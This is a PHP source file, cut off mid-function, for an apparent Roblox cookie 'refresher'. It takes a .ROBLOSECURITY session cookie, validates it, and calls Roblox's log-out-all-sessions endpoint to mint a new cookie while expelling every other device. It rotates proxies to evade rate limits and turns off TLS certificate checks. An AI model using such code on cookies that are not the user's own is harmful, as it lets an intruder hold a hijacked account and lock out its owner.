<?php
declare(strict_types=1);

namespace Langgor\Refresher;

require_once __DIR__ . '/ProxyManager.php';

class RobloxService {
    private const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
    public const MAX_RATELIMIT_RETRIES = 5;
    private static ?string $cachedCsrf = null;
    private static int $cachedCsrfTime = 0;
    private const CSRF_CACHE_TTL = 300; // 5 minutes

    public static function getCachedCSRF(): ?string {
        if (self::$cachedCsrf !== null && (time() - self::$cachedCsrfTime) < self::CSRF_CACHE_TTL) {
            return self::$cachedCsrf;
        }
        $cacheFile = sys_get_temp_dir() . '/roblox_csrf_cache.json';
        if (file_exists($cacheFile)) {
            $data = json_decode((string)@file_get_contents($cacheFile), true);
            if (is_array($data) && !empty($data['token']) && !empty($data['time'])) {
                if ((time() - (int)$data['time']) < self::CSRF_CACHE_TTL) {
                    self::$cachedCsrf = (string)$data['token'];
                    self::$cachedCsrfTime = (int)$data['time'];
                    return self::$cachedCsrf;
                }
            }
        }
        return null;
    }

    public static function setCachedCSRF(string $token): void {
        self::$cachedCsrf = $token;
        self::$cachedCsrfTime = time();
        $cacheFile = sys_get_temp_dir() . '/roblox_csrf_cache.json';
        @file_put_contents($cacheFile, json_encode(['token' => $token, 'time' => time()]), LOCK_EX);
    }

    public static function cleanCookie(string $input): string {
        $input = trim($input);

        // 1. JSON export support (e.g. from Cookie-Editor / EditThisCookie)
        if (str_contains($input, '{') || str_contains($input, '[')) {
            if (preg_match('/"value"\s*:\s*"([^"]+)"/i', $input, $jm)) {
                $input = $jm[1];
            }
        }

        // 2. Remove leading 'cookie:' case-insensitive
        $input = preg_replace('/^\s*cookie:\s*/i', '', $input);

        // 3. URL decode if percent-encoded (e.g., %7C -> |)
        if (stripos($input, '%7c') !== false) {
            $input = urldecode($input);
        }

        // 4. Strip internal whitespace (e.g. "_ | WARNING" -> "_|WARNING")
        $input = preg_replace('/\s+/', '', $input);

        // 5. If contains WARNING pattern (even if missing leading _ or |), normalize and extract cleanly
        if (preg_match('/(?:_|\|)*WARNING:-DO-NOT-SHARE-THIS[^;\'"\s]+/i', $input, $wm)) {
            return preg_replace('/^(?:_|\|)*WARNING/i', '_|WARNING', $wm[0]);
        }

        // 6. Look for .ROBLOSECURITY= or ROBLOSECURITY=
        if (preg_match('/\.?ROBLOSECURITY\s*=\s*([^;]+)/i', $input, $matches)) {
            $val = trim($matches[1], " \t\n\r\0\x0B\"'");
            return preg_replace('/\s+/', '', $val);
        }

        // 7. Split by semicolon if multiple cookies
        $parts = explode(';', $input);
        return trim($parts[0], " \t\n\r\0\x0B\"'");
    }

    public static function makeGetRequest(string $url, string $cookie, ?string $csrf = null, ?array $proxy = null): array {
        $timeout = (int)Config::get('CURL_TIMEOUT', 15);
        $connectTimeout = (int)Config::get('CURL_CONNECT_TIMEOUT', 8);

        $ch = curl_init($url);
        $headers = [
            'Cookie: .ROBLOSECURITY=' . $cookie,
            'User-Agent: ' . self::USER_AGENT,
            'Accept: application/json'
        ];
        if ($csrf) {
            $headers[] = 'X-CSRF-TOKEN: ' . $csrf;
        }

        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => false,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2TLS,
            CURLOPT_TCP_NODELAY => true,
            CURLOPT_ENCODING => '',
            CURLOPT_DNS_CACHE_TIMEOUT => 600,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_CONNECTTIMEOUT => $connectTimeout,
            CURLOPT_HTTPHEADER => $headers
        ]);

        $appliedProxy = ProxyManager::applyProxy($ch, $proxy);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode === 429) {
            if ($appliedProxy) {
                ProxyManager::markRateLimited($appliedProxy, 60);
            }
            return ['rate_limited' => true];
        }
        if ($httpCode !== 200) {
            return ['error' => true, 'code' => $httpCode];
        }

        $decoded = json_decode((string)$response, true);
        return is_array($decoded) ? $decoded : ['error' => true, 'message' => 'Malformed response'];
    }

    public static function makeGetRequestWithRetry(string $url, string $cookie, ?string $csrf = null): array {
        $maxRetries = (int)Config::get('MAX_RETRIES', 4);
        $delayMs = (int)Config::get('RETRY_DELAY_MS', 300);

        for ($attempt = 1; $attempt <= $maxRetries; $attempt++) {
            // On final attempt, fallback to direct connection if proxies keep failing
            $proxy = ($attempt === $maxRetries) ? null : ProxyManager::getProxy();
            $result = self::makeGetRequest($url, $cookie, $csrf, $proxy);

            if (!isset($result['rate_limited']) && !isset($result['error'])) {
                return $result;
            }

            if ($proxy) {
                if (isset($result['rate_limited'])) {
                    ProxyManager::markRateLimited($proxy, 60);
                } else {
                    ProxyManager::markRateLimited($proxy, 30);
                }
            }

            $sleepUs = ProxyManager::isEnabled() ? 100000 : ($delayMs * 1000 * $attempt);
            usleep($sleepUs);
        }

        return $result ?? ['error' => true, 'message' => 'Rate limited or failed after multiple retries'];
    }

    public static function multiGetRequests(array $urls, string $cookie, ?array $proxyOverrides = null): array {
        if (empty($urls)) {
            return [];
        }

        $timeout = (int)Config::get('CURL_TIMEOUT', 3);
        $connectTimeoutMs = 1500; // 1.5s fast connect timeout

        $multi = curl_multi_init();
        if (defined('CURLMOPT_PIPELINING')) {
            curl_multi_setopt($multi, CURLMOPT_PIPELINING, CURLPIPE_MULTIPLEX);
        }
        if (defined('CURLMOPT_MAX_TOTAL_CONNECTIONS')) {
            curl_multi_setopt($multi, CURLMOPT_MAX_TOTAL_CONNECTIONS, 100);
        }
        if (defined('CURLMOPT_MAX_HOST_CONNECTIONS')) {
            curl_multi_setopt($multi, CURLMOPT_MAX_HOST_CONNECTIONS, 20);
        }

        $handles = [];
        $taskStates = [];
        $results = [];

        // Multitasking: Assign dedicated, distinct top-tier proxy for each task endpoint
        // Thumbnails (thumbnails.roblox.com) are always fetched direct via edge CDN (50ms)
        $effectiveOverrides = (array)($proxyOverrides ?? []);
        foreach ($urls as $k => $u) {
            if (str_contains($u, 'thumbnails.roblox.com')) {
                $effectiveOverrides[$k] = null;
            }
        }
        $taskProxies = ProxyManager::getDistinctProxiesForTasks(array_keys($urls), $effectiveOverrides);

        foreach ($urls as $key => $url) {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER => false,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2TLS,
                CURLOPT_TCP_NODELAY => true,
                CURLOPT_ENCODING => '',
                CURLOPT_DNS_CACHE_TIMEOUT => 600,
                CURLOPT_NOSIGNAL => 1,
                CURLOPT_CONNECTTIMEOUT_MS => $connectTimeoutMs,
                CURLOPT_TIMEOUT => $timeout,
                CURLOPT_HTTPHEADER => [
                    'Cookie: .ROBLOSECURITY=' . $cookie,
                    'User-Agent: ' . self::USER_AGENT,
                    'Accept: application/json'
                ]
            ]);

            $p = $taskProxies[$key] ?? null;
            $appliedProxy = $p ? ProxyManager::applyProxy($ch, $p) : null;

            curl_multi_add_handle($multi, $ch);
            $hId = (int)$ch;
            $handles[$hId] = [
                'key' => $key,
                'ch' => $ch,
                'proxy' => $appliedProxy,
                'is_hedged' => false
            ];
            $taskStates[$key] = [
                'primary_id' => $hId,
                'hedged_id' => null,
                'done' => false
            ];
        }

        $startTime = microtime(true);
        $hedgeThresholdSec = 1.2; // Hedged request threshold: 1.2s
        $hedgedSpawned = false;
        $running = null;

        do {
            $status = curl_multi_exec($multi, $running);

            // Read completed handles immediately as they arrive
            while ($info = curl_multi_info_read($multi)) {
                $ch = $info['handle'];
                $hId = (int)$ch;
                if (!isset($handles[$hId])) {
                    continue;
                }

                $meta = $handles[$hId];
                $key = $meta['key'];

                // If task already resolved by twin handle, discard and clean up
                if (!empty($taskStates[$key]['done'])) {
                    curl_multi_remove_handle($multi, $ch);
                    curl_close($ch);
                    unset($handles[$hId]);
                    continue;
                }

                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $response = curl_multi_getcontent($ch);
                $proxyUsed = $meta['proxy'];

                curl_multi_remove_handle($multi, $ch);
                curl_close($ch);
                unset($handles[$hId]);

                if ($httpCode === 200 && is_string($response)) {
                    $decoded = json_decode($response, true);
                    $results[$key] = is_array($decoded) ? $decoded : ['error' => true];
                    $taskStates[$key]['done'] = true;

                    // Abort sibling handle if still running
                    $siblingId = $meta['is_hedged'] ? ($taskStates[$key]['primary_id'] ?? null) : ($taskStates[$key]['hedged_id'] ?? null);
                    if ($siblingId !== null && isset($handles[$siblingId])) {
                        curl_multi_remove_handle($multi, $handles[$siblingId]['ch']);
                        curl_close($handles[$siblingId]['ch']);
                        unset($handles[$siblingId]);
                    }
                } elseif ($httpCode === 429) {
                    if (!empty($proxyUsed)) {
                        ProxyManager::markRateLimited($proxyUsed, 60);
                    }
                    if (empty($taskStates[$key]['done'])) {
                        $results[$key] = ['rate_limited' => true];
                        $taskStates[$key]['done'] = true;
                    }
                } else {
                    if (!empty($proxyUsed) && ($httpCode === 0 || $httpCode >= 500)) {
                        ProxyManager::markRateLimited($proxyUsed, 30);
                    }
                    $siblingId = $meta['is_hedged'] ? ($taskStates[$key]['primary_id'] ?? null) : ($taskStates[$key]['hedged_id'] ?? null);
                    if ($siblingId === null || !isset($handles[$siblingId])) {
                        $results[$key] = ['error' => true, 'code' => $httpCode];
                        $taskStates[$key]['done'] = true;
                    }
                }
            }

            // HEDGED REQUEST ENGINE:
            // If elapsed time reaches 1.2s and any primary proxy task is still pending, spawn parallel direct hedge
            $elapsed = microtime(true) - $startTime;
            if ($elapsed >= $hedgeThresholdSec && !$hedgedSpawned) {
                $hedgedSpawned = true;
                foreach ($taskStates as $key => &$st) {
                    if (!$st['done'] && $st['hedged_id'] === null) {
                        $origUrl = $urls[$key];
                        $hCh = curl_init($origUrl);
                        curl_setopt_array($hCh, [
                            CURLOPT_RETURNTRANSFER => true,
                            CURLOPT_HEADER => false,
                            CURLOPT_SSL_VERIFYPEER => false,
                            CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
                            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2TLS,
                            CURLOPT_TCP_NODELAY => true,
                            CURLOPT_ENCODING => '',
                            CURLOPT_DNS_CACHE_TIMEOUT => 600,
                            CURLOPT_NOSIGNAL => 1,
                            CURLOPT_CONNECTTIMEOUT_MS => 1000,
                            CURLOPT_TIMEOUT => 2,
                            CURLOPT_HTTPHEADER => [
                                'Cookie: .ROBLOSECURITY=' . $cookie,
                                'User-Agent: ' . self::USER_AGENT,
                                'Accept: application/json'
                            ]
                        ]);

                        $newHId = (int)$hCh;
                        $handles[$newHId] = [
                            'key' => $key,
                            'ch' => $hCh,
                            'proxy' => null, // Hedged direct connection (fastest possible fallback)
                            'is_hedged' => true
                        ];
                        $st['hedged_id'] = $newHId;
                        curl_multi_add_handle($multi, $hCh);
                    }
                }
                unset($st);
            }

            if ($running) {
                if (curl_multi_select($multi, 0.005) === -1) {
                    usleep(250);
                }
            }
        } while (($running > 0 || count($handles) > 0) && $status === CURLM_OK);

        // Ensure any remaining open handles are closed
        foreach ($handles as $item) {
            curl_multi_remove_handle($multi, $item['ch']);
            curl_close($item['ch']);
        }
        curl_multi_close($multi);

        return $results;
    }

    /**
     * Resilient parallel request runner with auto-retry on rate-limits AND errors until success.
     * Failed endpoints are re-attempted with fresh proxies, with direct fallback on final attempt.
     */
    public static function multiGetRequestsWithAutoRetry(array $urls, string $cookie, int $maxRetries = 2): array {
        if (empty($urls)) {
            return [];
        }

        $allResponses = [];
        $pendingUrls = $urls;

        for ($attempt = 1; $attempt <= $maxRetries && !empty($pendingUrls); $attempt++) {
            // On final attempt, force direct connection (proxy = null) for any stubborn endpoints
            $overrides = [];
            if ($attempt === $maxRetries) {
                foreach ($pendingUrls as $k => $u) {
                    $overrides[$k] = null;
                }
            }

            $responses = self::multiGetRequests($pendingUrls, $cookie, !empty($overrides) ? $overrides : null);
            $failedUrls = [];

            foreach ($responses as $key => $res) {
                $isFailed = !is_array($res) || isset($res['error']) || isset($res['rate_limited']);
                if ($isFailed) {
                    $failedUrls[$key] = $pendingUrls[$key];
                } else {
                    $allResponses[$key] = $res;
                }
            }

            if (empty($failedUrls)) {
                break; // All endpoints succeeded!
            }

            $pendingUrls = $failedUrls;
            usleep(100000 * $attempt);
        }

        // Merge any remaining failed responses so callers never hit undefined index
        foreach ($pendingUrls as $key => $url) {
            if (!isset($allResponses[$key])) {
                $allResponses[$key] = $responses[$key] ?? ['error' => true];
            }
        }

        return $allResponses;
    }

    public static function getCSRF(string $cookie, bool $forceFresh = false, ?array $proxy = null): string|array|null {
        if (!$forceFresh) {
            $cached = self::getCachedCSRF();
            if ($cached !== null && !empty($cached)) {
                return $cached;
            }
        }

        // Fast, completely safe endpoints probed concurrently in parallel via curl_multi.
        // NOTE: No cookies are ever sent here to prevent any unintended session state change.
        $endpoints = [
            'https://economy.roblox.com/v1/purchases/products/1',
            'https://accountsettings.roblox.com/v1/email',
            'https://friends.roblox.com/v1/users/1/request-friendship',
            'https://auth.roblox.com/v1/authentication-ticket'
        ];

        $multi = curl_multi_init();
        if (defined('CURLMOPT_PIPELINING')) {
            curl_multi_setopt($multi, CURLMOPT_PIPELINING, CURLPIPE_MULTIPLEX);
        }
        $handles = [];

        foreach ($endpoints as $url) {
            $ch = curl_init($url);
            $headers = [
                'Content-Type: application/json',
                'User-Agent: ' . self::USER_AGENT,
                'Origin: https://www.roblox.com',
                'Referer: https://www.roblox.com/'
            ];

            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => '{}',
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2TLS,
                CURLOPT_TCP_NODELAY => true,
                CURLOPT_ENCODING => '',
                CURLOPT_DNS_CACHE_TIMEOUT => 600,
                CURLOPT_TIMEOUT => 4,
                CURLOPT_CONNECTTIMEOUT => 2,
                CURLOPT_REFERER => 'https://www.roblox.com/',
                CURLOPT_HTTPHEADER => $headers
            ]);

            ProxyManager::applyProxy($ch, $proxy);

            curl_multi_add_handle($multi, $ch);
            $handles[] = $ch;
        }

        $csrfToken = null;
        $rateLimited = false;

        $running = null;
        do {
            $status = curl_multi_exec($multi, $running);

            // Check completed transfers as soon as they finish
            while ($info = curl_multi_info_read($multi)) {
                $completedHandle = $info['handle'];
                $out = curl_multi_getcontent($completedHandle);
                $httpCode = curl_getinfo($completedHandle, CURLINFO_HTTP_CODE);
                $hsize = curl_getinfo($completedHandle, CURLINFO_HEADER_SIZE);

                if ($httpCode === 429) {
                    $rateLimited = true;
                }

                if (is_string($out) && $hsize > 0) {
                    $headerBlock = substr($out, 0, $hsize);
                    if (preg_match('/x-csrf-token:\s*([^\r\n]+)/i', $headerBlock, $m)) {
                        $token = trim($m[1]);
                        if (!empty($token)) {
                            $csrfToken = $token;
                            self::setCachedCSRF($token);
                            break 2; // Immediately finish as soon as fastest endpoint returns CSRF
                        }
                    }
                }
            }

            if ($running) {
                if (curl_multi_select($multi, 0.005) === -1) {
                    usleep(250);
                }
            }
        } while ($running && $status === CURLM_OK);

        foreach ($handles as $ch) {
            curl_multi_remove_handle($multi, $ch);
            curl_close($ch);
        }
        curl_multi_close($multi);

        if ($csrfToken !== null) {
            return $csrfToken;
        }

        // If proxy failed, automatically retry probe via direct connection
        if ($proxy !== null) {
            $directToken = self::getCSRF($cookie, true, null);
            if (is_string($directToken) && !empty($directToken)) {
                return $directToken;
            }
        }

        if ($rateLimited) {
            return ['rate_limited' => true];
        }

        return null;
    }

    public static function logoutAllAndReauthenticate(string $cookie, string $csrf, ?callable $onProgress = null, ?array $proxy = null): string|array|null {
        $timeout = (int)Config::get('CURL_TIMEOUT', 15);
        $connectTimeout = (int)Config::get('CURL_CONNECT_TIMEOUT', 8);

        for ($attempt = 1; $attempt <= self::MAX_RATELIMIT_RETRIES; $attempt++) {
            $ch = curl_init('https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate');
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => '{}',
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2TLS,
                CURLOPT_TCP_NODELAY => true,
                CURLOPT_ENCODING => '',
                CURLOPT_DNS_CACHE_TIMEOUT => 600,
                CURLOPT_TIMEOUT => $timeout,
                CURLOPT_CONNECTTIMEOUT => $connectTimeout,
                CURLOPT_REFERER => 'https://www.roblox.com/',
                CURLOPT_HTTPHEADER => [
                    'Cookie: .ROBLOSECURITY=' . $cookie,
                    'X-CSRF-TOKEN: ' . $csrf,
                    'Content-Type: application/json',
                    'User-Agent: ' . self::USER_AGENT,
                    'Origin: https://www.roblox.com',
                    'Referer: https://www.roblox.com/'
                ]
            ]);

            $appliedProxy = ProxyManager::applyProxy($ch, $proxy);

            $out = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $hsize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
            curl_close($ch);

            if ($httpCode === 429 && $appliedProxy) {
                ProxyManager::markRateLimited($appliedProxy, 60);
            }

            // Retry on CSRF 403 challenge
            if ($httpCode === 403 && is_string($out)) {
                $headerBlock = substr($out, 0, $hsize);
                if (preg_match('/x-csrf-token:\s*([^\r\n]+)/i', $headerBlock, $cm)) {
                    $csrf = trim($cm[1]);
                    self::setCachedCSRF($csrf);
                    $ch = curl_init('https://auth.roblox.com/v2/logoutfromallsessionsandreauthenticate');
                    curl_setopt_array($ch, [
                        CURLOPT_POST => true,
                        CURLOPT_POSTFIELDS => '{}',
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_HEADER => true,
                        CURLOPT_SSL_VERIFYPEER => false,
                        CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
                        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                        CURLOPT_TCP_NODELAY => true,
                        CURLOPT_TIMEOUT => $timeout,
                        CURLOPT_CONNECTTIMEOUT => $connectTimeout,
                        CURLOPT_REFERER => 'https://www.roblox.com/',
                        CURLOPT_HTTPHEADER => [
                            'Cookie: .ROBLOSECURITY=' . $cookie,
                            'X-CSRF-TOKEN: ' . $csrf,
                            'Content-Type: application/json',
                            'User-Agent: ' . self::USER_AGENT,
                            'Origin: https://www.roblox.com',
                            'Referer: https://www.roblox.com/'
                        ]
                    ]);
                    $out = curl_exec($ch);
                    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    $hsize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
                    curl_close($ch);
                }
            }

            if ($httpCode === 429) {
                $headerBlock = is_string($out) ? substr($out, 0, $hsize) : '';
                $waitSec = 2 * $attempt;
                if (preg_match('/retry-after:\s*(\d+)/i', $headerBlock, $rm)) {
                    $waitSec = max((int)$rm[1], 2);
                }
                if ($onProgress) {
                    call_user_func($onProgress, 'ratelimit_wait', [
                        'step' => 'logout_all',
                        'attempt' => $attempt,
                        'wait_seconds' => $waitSec,
                        'message' => "Roblox rate limit hit during logout. Waiting {$waitSec}s before retrying... (Attempt {$attempt}/" . self::MAX_RATELIMIT_RETRIES . ")"
                    ]);
                }
                sleep($waitSec);
                continue;
            }

            if (is_string($out) && preg_match('/\.ROBLOSECURITY=([^;]+)/i', $out, $cm)) {
                return trim($cm[1], " \t\n\r\0\x0B\"'");
            }
            break;
        }

        if (isset($httpCode) && $httpCode === 429) {
            return ['rate_limited' => true];
        }
        return null;
    }

    /**
     * Invalidate all sessions on all devices and re-authenticate current session (invamode).
     * Returns structured result with success status, new cookie, user data, or detailed error.
     */
    public static function invalidateSession(string $rawCookie, ?callable $onProgress = null): array {
        $cleanCookie = self::cleanCookie($rawCookie);
        if (empty($cleanCookie) || strlen($cleanCookie) < 100) {
            return [
                'success' => false,
                'message' => 'Format cookie tidak valid atau terlalu pendek (.ROBLOSECURITY diperlukan).'
            ];
        }

        $sessionProxy = ProxyManager::isEnabled() ? ProxyManager::getProxy('fastest_first') : null;

        if ($onProgress) {
            call_user_func($onProgress, 'precheck', ['message' => 'Memvalidasi sesi cookie & security challenge...']);
        }

        $initCheck = self::validateAndGetCSRF($cleanCookie, $sessionProxy);
        if (empty($initCheck['valid'])) {
            return [
                'success' => false,
                'message' => $initCheck['message'] ?? 'Cookie tidak valid atau sesi telah kedaluwarsa.'
            ];
        }

        $userData = $initCheck['userData'] ?? null;
        $csrf = $initCheck['csrf'] ?? null;
        $sessionProxy = $initCheck['workingProxy'] ?? null;

        if (empty($csrf)) {
            $csrf = self::getCSRF($cleanCookie, false, $sessionProxy);
            for ($attempt = 1; is_array($csrf) && isset($csrf['rate_limited']) && $attempt <= self::MAX_RATELIMIT_RETRIES; $attempt++) {
                if ($sessionProxy) {
                    ProxyManager::markRateLimited($sessionProxy, 60);
                    $sessionProxy = ProxyManager::getProxy('random', $sessionProxy);
                }
                $waitSec = ProxyManager::isEnabled() ? 1 : (2 * $attempt);
                if ($onProgress) {
                    call_user_func($onProgress, 'ratelimit_wait', [
                        'step' => 'csrf_token',
                        'attempt' => $attempt,
                        'wait_seconds' => $waitSec,
                        'message' => "Roblox rate limit hit. " . (ProxyManager::isEnabled() ? "Merotasi ke proxy baru..." : "Menunggu {$waitSec}s...") . " (Percobaan {$attempt}/" . self::MAX_RATELIMIT_RETRIES . ")"
                    ]);
                }
                sleep($waitSec);
                $csrf = self::getCSRF($cleanCookie, true, $sessionProxy);
            }
            if (is_array($csrf) && isset($csrf['rate_limited'])) {
                return [
                    'success' => false,
                    'message' => 'Roblox service sedang terkena rate limit (429). Silakan tunggu sebentar dan coba lagi.'
                ];
            }
            if (!$csrf) {
                return [
                    'success' => false,
                    'message' => 'Gagal mendapatkan CSRF token dari Roblox. Cookie mungkin tidak valid atau Roblox tidak dapat dijangkau.'
                ];
            }
        }

        if ($onProgress) {
            call_user_func($onProgress, 'invalidate', ['message' => 'Mengirim permintaan logout semua sesi perangkat lain & re-autentikasi...']);
        }

        $logoutResult = self::logoutAllAndReauthenticate($cleanCookie, $csrf, $onProgress, $sessionProxy);
        if (is_array($logoutResult) && isset($logoutResult['rate_limited'])) {
            return [
                'success' => false,
                'message' => 'Roblox rate limit exceeded saat proses logout sesi. Silakan tunggu beberapa detik dan coba lagi.'
            ];
        }

        if (is_string($logoutResult) && !empty($logoutResult)) {
            return [
                'success' => true,
                'cookie' => self::cleanCookie($logoutResult),
                'oldCookie' => $cleanCookie,
                'userData' => $userData,
                'message' => 'Semua sesi pada perangkat lain berhasil di-logout total dan cookie sesi baru berhasil diterbitkan.'
            ];
        }

        return [
            'success' => false,
            'message' => 'Roblox menolak permintaan logout from all sessions and reauthenticate. Sesi mungkin memerlukan challenge keamanan atau verifikasi tambahan.'
        ];
    }

    /**
     * Resilient pre-flight auth check via users.roblox.com.
     * Evaluates candidate routes (proxy with guaranteed direct connection fallback).
     * ONLY rejects with 'Cookie tidak valid' if Roblox explicitly returns HTTP 401 Unauthorized.
     * All network drops, timeouts, and proxy failures trigger fallback without falsely failing valid cookies.
     */
    public static function quickValidateCookie(string $cookie, ?array $proxy = null): array {
        $cleanCookie = self::cleanCookie($cookie);
        if (empty($cleanCookie) || strlen($cleanCookie) < 100) {
            return ['valid' => false, 'message' => 'Format cookie tidak valid atau terlalu pendek.'];
        }

        // Build route list: try candidate proxy first (if provided), with direct connection fallback
        $routes = [];
        if ($proxy !== null) {
            $routes[] = $proxy;
            $routes[] = null; // Direct fallback
        } else {
            $routes[] = null; // Direct first
            if (ProxyManager::isEnabled()) {
                $p = ProxyManager::getProxy('fastest_first');
                if ($p) {
                    $routes[] = $p;
                }
            }
        }

        $lastHttpCode = 0;
        $authRateLimited = false;
        $timeout = (int)Config::get('CURL_TIMEOUT', 4);
        $connectTimeout = (int)Config::get('CURL_CONNECT_TIMEOUT', 2);

        foreach ($routes as $currentProxy) {
            $ch = curl_init('https://users.roblox.com/v1/users/authenticated');
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER => false,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2TLS,
                CURLOPT_TCP_NODELAY => true,
                CURLOPT_ENCODING => '',
                CURLOPT_DNS_CACHE_TIMEOUT => 600,
                CURLOPT_TIMEOUT => $timeout,
                CURLOPT_CONNECTTIMEOUT => $connectTimeout,
                CURLOPT_REFERER => 'https://www.roblox.com/',
                CURLOPT_HTTPHEADER => [
                    'Cookie: .ROBLOSECURITY=' . $cleanCookie,
                    'User-Agent: ' . self::USER_AGENT,
                    'Accept: application/json',
                    'Origin: https://www.roblox.com'
                ]
            ]);

            $appliedProxy = $currentProxy ? ProxyManager::applyProxy($ch, $currentProxy) : null;
            $out = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            $lastHttpCode = $httpCode;

            // 1. HTTP 200: Successfully authenticated! Cookie is 100% valid
            if ($httpCode === 200 && is_string($out)) {
                $data = json_decode($out, true);
                if (is_array($data) && !empty($data['id']) && is_numeric($data['id']) && (int)$data['id'] > 0) {
                    return [
                        'valid' => true,
                        'userData' => $data,
                        'workingProxy' => $appliedProxy
                    ];
                }
            }

            // 2. HTTP 401 Unauthorized: The ONLY true indication that cookie is invalid / expired
            if ($httpCode === 401) {
                // If a proxy returned 401, verify with direct connection before concluding invalid
                if ($appliedProxy !== null) {
                    continue; // Will execute next route (direct connection)
                }
                return ['valid' => false, 'message' => 'Cookie tidak valid atau sesi telah kedaluwarsa.'];
            }

            // 3. HTTP 429: Rate limited
            if ($httpCode === 429) {
                $authRateLimited = true;
                if ($appliedProxy) {
                    ProxyManager::markRateLimited($appliedProxy, 60);
                }
                continue;
            }

            // 4. Proxy/Network error (HTTP 0, 403, 5xx): mark cooled down and continue to next route
            if ($appliedProxy) {
                ProxyManager::markRateLimited($appliedProxy, 120);
            }
        }

        if ($authRateLimited) {
            return [
                'valid' => false,
                'rate_limited' => true,
                'message' => 'Layanan Roblox sedang terkena limit (429). Silakan tunggu sebentar dan coba lagi.'
            ];
        }

        if ($lastHttpCode === 0) {
            return [
                'valid' => false,
                'network_error' => true,
                'message' => 'Gagal menghubungi server Roblox (koneksi terputus/timeout). Silakan periksa koneksi atau coba lagi.'
            ];
        }

        return ['valid' => false, 'message' => 'Cookie tidak valid atau sesi telah kedaluwarsa.'];
    }

    /**
     * Resilient concurrent pre-flight auth check & CSRF token retrieval.
     * Uses verified working route with automatic direct connection fallback.
     */
    public static function validateAndGetCSRF(string $cookie, ?array $proxy = null): array {
        $cleanCookie = self::cleanCookie($cookie);
        if (empty($cleanCookie) || strlen($cleanCookie) < 100) {
            return ['valid' => false, 'message' => 'Format cookie tidak valid atau terlalu pendek.'];
        }

        $cached = self::getCachedCSRF();
        if ($cached !== null && !empty($cached)) {
            $pre = self::quickValidateCookie($cleanCookie, $proxy);
            return [
                'valid' => !empty($pre['valid']),
                'userData' => $pre['userData'] ?? null,
                'csrf' => $cached,
                'workingProxy' => $pre['workingProxy'] ?? null,
                'rate_limited' => !empty($pre['rate_limited']),
                'message' => $pre['message'] ?? null
            ];
        }

        // Validate cookie first using resilient quickValidateCookie
        $auth = self::quickValidateCookie($cleanCookie, $proxy);
        if (empty($auth['valid'])) {
            return $auth;
        }

        // Auth is 100% valid! Obtain CSRF token using the working route or fallback
        $workingProxy = $auth['workingProxy'] ?? null;
        $csrf = self::getCSRF($cleanCookie, false, $workingProxy);

        // If CSRF probe failed with that proxy, retry directly without proxy
        if ((empty($csrf) || is_array($csrf)) && $workingProxy !== null) {
            $csrf = self::getCSRF($cleanCookie, true, null);
        }

        return [
            'valid' => true,
            'userData' => $auth['userData'] ?? null,
            'csrf' => is_string($csrf) ? $csrf : null,
            'workingProxy' => $workingProxy,
            'rate_limited' => is_array($csrf) && !empty($csrf['rate_limited']),
            'message' => null
        ];
    }

    public static function refresh(string $rawCookie, bool $logoutOthers = false, ?callable $onProgress = null): array {
        $cleanCookie = self::cleanCookie($rawCookie);
        if (empty($cleanCookie) || strlen($cleanCookie) < 100) {
            return ['success' => false, 'message' => 'Format cookie tidak valid atau terlalu pendek.'];
        }

        // Dedicated session proxy: If proxies enabled, pick one, BUT validation handles fallback automatically!
        $sessionProxy = ProxyManager::isEnabled() ? ProxyManager::getProxy('fastest_first') : null;

        // Concurrent pre-flight auth & CSRF token retrieval
        $initCheck = self::validateAndGetCSRF($cleanCookie, $sessionProxy);
        if (empty($initCheck['valid'])) {
            return [
                'success' => false,
                'message' => $initCheck['message'] ?? 'Cookie tidak valid atau sesi telah kedaluwarsa.'
            ];
        }

        $userData = $initCheck['userData'] ?? null;
        $csrf = $initCheck['csrf'] ?? null;
        // Bind session to the route that ACTUALLY worked in pre-flight!
        $sessionProxy = $initCheck['workingProxy'] ?? null;

        if (empty($csrf)) {
            $csrf = self::getCSRF($cleanCookie, true, $sessionProxy);
